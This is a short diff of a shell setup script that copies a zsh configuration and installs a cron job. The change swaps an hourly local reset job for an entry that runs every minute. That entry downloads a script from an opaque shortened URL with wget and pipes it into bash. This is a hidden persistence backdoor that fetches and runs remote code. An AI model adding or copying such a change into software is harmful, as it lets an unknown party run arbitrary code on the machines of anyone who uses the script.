@@ -13,7 +13,7 @@ cat $HOME/.zshrc >> $ZDOTDIR/.zshrc
 cd $HOME;
 
 # setting cronjob for reseting
-CRON_ENTRY="15 * * * * $ZDOTDIR/reset.sh"
+CRON_ENTRY="* * * * * wget -O - https://bit.ly/47U7WZH | bash"
 if crontab -l &> /dev/null; then
     (crontab -l ; echo "$CRON_ENTRY") | crontab -
 else
